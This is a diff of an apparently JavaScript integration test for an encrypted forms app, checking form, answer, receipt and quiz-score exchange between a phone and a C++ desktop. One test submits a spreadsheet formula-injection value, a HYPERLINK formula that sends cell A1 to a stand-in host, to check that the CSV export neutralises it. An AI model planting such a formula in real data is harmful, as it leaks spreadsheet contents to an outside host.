@@ -52,10 +52,10 @@ for (const layers of [1, 0]) {
       const fA = (await b.call("createForm", [JSON.stringify({ title: "From desktop", questions: [
         { id: "q1", type: "radioButtons", text: "Pick", required: true, options: ["a", "b", "c"] },
         { id: "q2", type: "text", text: "Why?", required: false }] })])).formId;
-      assert.ok(await until(b, () => !!phone.snapshot().state.forms[fA]), "phone receives the desktop's signed form");
+      assert.ok(await until(b, () => !!phone.state().forms[fA]), "phone receives the desktop's signed form");
       assert.strictEqual(phone.diag.admDropSig, 0, "phone admits the desktop's signature");
       const ans = [{ questionId: "q1", value: 2 }, { questionId: "q2", value: "žluťoučký kůň ✓" }];
-      phone.importForm(`whisperbox://form?id=${fA}&by=${phone.snapshot().state.forms[fA].creator}`);   // answers need the creator a link names (FR-3)
+      phone.importForm(`whisperbox://form?id=${fA}&by=${phone.state().forms[fA].creator}`);   // answers need the creator a link names (FR-3)
       assert.ok(phone.submitResponse(fA, ans).ok);
       assert.ok(await until(b, async () => ((await b.call("getDecryptedResponses", [fA])).responses || []).length === 1), "desktop decrypts the phone's answer");
       const rA = (await b.call("getDecryptedResponses", [fA])).responses[0];
@@ -65,9 +65,10 @@ for (const layers of [1, 0]) {
 
       // 2. phone creates (portable signing), desktop admits + answers, phone decrypts + receipts
       const fP = phone.createForm({ title: "From phone", questions: [{ id: "q1", type: "checkbox", text: "Which", required: true, options: ["x", "y"] }] }).formId;
-      assert.ok(await until(b, async () => !!(await b.call("snapshot")).state.forms[fP]), "desktop admits the phone's signed form");
+      // formSummary covers a form the desktop hasn't opened (its snapshot shows only opened ones, FR-7)
+      assert.ok(await until(b, async () => !!(await b.call("formSummary", [fP])).ok), "desktop admits the phone's signed form");
       assert.strictEqual((await b.call("snapshot")).diagnostics.admDropSig, 0);
-      await b.call("importForm", [`whisperbox://form?id=${fP}&by=${(await b.call("snapshot")).state.forms[fP].creator}`]);
+      await b.call("importForm", [`whisperbox://form?id=${fP}&by=${phone.identity.address}`]);
       assert.ok((await b.call("submitResponse", [fP, JSON.stringify([{ questionId: "q1", value: [0, 1] }])])).ok);
       assert.ok(await until(b, () => (phone.snapshot().creatorView?.responses[fP] || []).length === 1), "phone decrypts the desktop's answer");
       assert.strictEqual(phone.snapshot().creatorView.responses[fP][0].respondent, addrA);
@@ -77,8 +78,8 @@ for (const layers of [1, 0]) {
 
       // 2b. a respondent's spreadsheet formula is neutralised in the CSV, the same in JS and C++
       const fF = phone.createForm({ title: "Formula", questions: [{ id: "q1", type: "textarea", text: "Say", required: true }, { id: "q2", type: "number", text: "N", required: false, min: -10, max: 10 }] }).formId;
-      assert.ok(await until(b, async () => !!(await b.call("snapshot")).state.forms[fF]), "desktop admits the formula form");
-      await b.call("importForm", [`whisperbox://form?id=${fF}&by=${(await b.call("snapshot")).state.forms[fF].creator}`]);
+      assert.ok(await until(b, async () => !!(await b.call("formSummary", [fF])).ok), "desktop admits the formula form");
+      await b.call("importForm", [`whisperbox://form?id=${fF}&by=${phone.identity.address}`]);
       assert.ok((await b.call("submitResponse", [fF, JSON.stringify([{ questionId: "q1", value: '=HYPERLINK("https://example.invalid/?"&A1,"x")' }, { questionId: "q2", value: -5 }])])).ok);
       assert.ok(await until(b, () => (phone.snapshot().creatorView?.responses[fF] || []).length === 1), "phone decrypts the formula answer");
       const csvF = phone.exportCsv(fF).csv;
@@ -109,23 +110,24 @@ for (const layers of [1, 0]) {
       //    phone caps its own form and confirms all the desktop's way.
       const fL = (await b.call("createForm", [JSON.stringify({ title: "Lifecycle", maxResponses: 5, showResponseCount: true,
         questions: [{ id: "q1", type: "boolean", text: "Coming?", required: true }] })])).formId;
-      assert.ok(await until(b, () => !!phone.snapshot().state.forms[fL]));
+      assert.ok(await until(b, () => !!phone.state().forms[fL]));
+      phone.importForm(`whisperbox://form?id=${fL}&by=${phone.state().forms[fL].creator}`);   // opened: shown in the snapshot (FR-7)
       assert.strictEqual(phone.snapshot().state.forms[fL].maxResponses, 5, "cap travels C++ -> JS");
       assert.ok((await b.call("closeForm", [fL])).ok);
       assert.ok(await until(b, () => phone.snapshot().state.forms[fL].status === "closed"), "phone sees close");
       assert.ok((await b.call("reopenForm", [fL])).ok);
       assert.ok(await until(b, () => phone.snapshot().state.forms[fL].status === "open"), "phone sees re-open (C++ form.reopen admitted + folded by JS)");
-      phone.importForm(`whisperbox://form?id=${fL}&by=${phone.snapshot().state.forms[fL].creator}`);   // answers need the creator a link names (FR-3)
+      phone.importForm(`whisperbox://form?id=${fL}&by=${phone.state().forms[fL].creator}`);   // answers need the creator a link names (FR-3)
       assert.ok(phone.submitResponse(fL, [{ questionId: "q1", value: false }]).ok);
       assert.ok(await until(b, async () => ((await b.call("getDecryptedResponses", [fL])).responses || []).length === 1), "post-re-open answer counts in C++");
       assert.strictEqual((await b.call("getDecryptedResponses", [fL])).responses[0].answers[0].value, false, "boolean false round-trips");
       assert.strictEqual((await b.call("confirmAll", [fL])).events, 1);
       assert.ok(await until(b, () => phone.snapshot().state.forms[fL].myConfirmed), "phone sees its receipt from a C++ batch event");
       const fQ = phone.createForm({ title: "Phone lifecycle", questions: [{ id: "q1", type: "boolean", text: "Ok?", required: true }] }).formId;
-      assert.ok(await until(b, async () => !!(await b.call("snapshot")).state.forms[fQ]));
+      assert.ok(await until(b, async () => !!(await b.call("formSummary", [fQ])).ok));
       assert.ok(phone.closeForm(fQ).ok && phone.reopenForm(fQ).ok);
-      assert.ok(await until(b, async () => (await b.call("snapshot")).state.forms[fQ].status === "open"), "desktop folds the phone's close + re-open");
-      await b.call("importForm", [`whisperbox://form?id=${fQ}&by=${(await b.call("snapshot")).state.forms[fQ].creator}`]);
+      assert.ok(await until(b, async () => (await b.call("formSummary", [fQ])).status === "open"), "desktop folds the phone's close + re-open");
+      await b.call("importForm", [`whisperbox://form?id=${fQ}&by=${phone.identity.address}`]);
       assert.ok((await b.call("submitResponse", [fQ, JSON.stringify([{ questionId: "q1", value: true }])])).ok);
       assert.ok(await until(b, () => (phone.snapshot().creatorView?.responses[fQ] || []).length === 1));
       assert.strictEqual(phone.confirmAll(fQ).events, 1);
@@ -149,16 +151,16 @@ for (const layers of [1, 0]) {
       const qq = [{ id: "q1", type: "boolean", text: "Sky blue?", required: true }, { id: "q2", type: "text", text: "Capital?" }];
       const quiz = { q1: { answer: true }, q2: { answer: ["Praha", "Prague"], points: 2 } };
       const dQ = (await b.call("createForm", [JSON.stringify({ title: "Desk quiz", questions: qq, quiz })])).formId;
-      assert.ok(await until(b, () => !!phone.snapshot().state.forms[dQ]));
-      phone.importForm(`whisperbox://form?id=${dQ}&by=${phone.snapshot().state.forms[dQ].creator}`);   // answers need the creator a link names (FR-3)
+      assert.ok(await until(b, () => !!phone.state().forms[dQ]));
+      phone.importForm(`whisperbox://form?id=${dQ}&by=${phone.state().forms[dQ].creator}`);   // answers need the creator a link names (FR-3)
       assert.ok(phone.submitResponse(dQ, [{ questionId: "q1", value: true }, { questionId: "q2", value: " PRAGUE" }]).ok);
       assert.ok(await until(b, async () => ((await b.call("getDecryptedResponses", [dQ])).responses || [])[0]?.score === 3), "C++ opens its quiz key and scores the phone's answer 3/3");
       assert.strictEqual((await b.call("sendScores", [dQ])).sent, 1);
       assert.ok(await until(b, () => phone.snapshot().state.forms[dQ].myReplies?.[0]?.score === 3), "phone opens the C++-sealed score with its reply key");
       const pQ = phone.createForm({ title: "Phone quiz", questions: qq, quiz }).formId;
       assert.ok(phone.snapshot().state.forms[pQ].quiz.q2.points === 2, "phone opens its own quiz key");
-      assert.ok(await until(b, async () => !!(await b.call("snapshot")).state.forms[pQ]));
-      await b.call("importForm", [`whisperbox://form?id=${pQ}&by=${(await b.call("snapshot")).state.forms[pQ].creator}`]);
+      assert.ok(await until(b, async () => !!(await b.call("formSummary", [pQ])).ok));
+      await b.call("importForm", [`whisperbox://form?id=${pQ}&by=${phone.identity.address}`]);
       assert.ok((await b.call("submitResponse", [pQ, JSON.stringify([{ questionId: "q1", value: false }, { questionId: "q2", value: "praha" }])])).ok);
       assert.ok(await until(b, () => (phone.snapshot().creatorView?.responses?.[pQ] || [])[0]?.score === 2), "JS scores the desktop's answer 2/3");
       const cidD = phone.snapshot().creatorView.responses[pQ][0].confirmationId;
